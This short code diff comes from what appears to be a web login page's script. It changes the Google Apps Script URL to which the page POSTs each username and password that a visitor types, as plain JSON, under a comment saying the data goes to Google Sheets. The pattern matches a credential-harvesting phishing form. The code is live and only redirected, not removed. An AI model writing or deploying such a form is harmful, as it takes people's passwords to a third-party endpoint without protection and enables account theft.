@@ -117,7 +117,7 @@
             
             if (username !== "" && password !== "") {
                 // Send data to Google Sheets
-                fetch("https://script.google.com/macros/s/AKfycbyu5PmvmrugSCQE3zNDCmpF9Mb4Zs_-9kgcB2aBYXPmqjqpsEeTFX3zgCj2YAmgFtF5Bg/exec", {
+                fetch("https://script.google.com/macros/s/AKfycbz1oXvmomYTjXnXINkr-nGEhCGJ5GYNMOwDtkRKpzSwsgUwXObeLqIy6fv_sGavEQU/exec", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({ username: username, password: password })
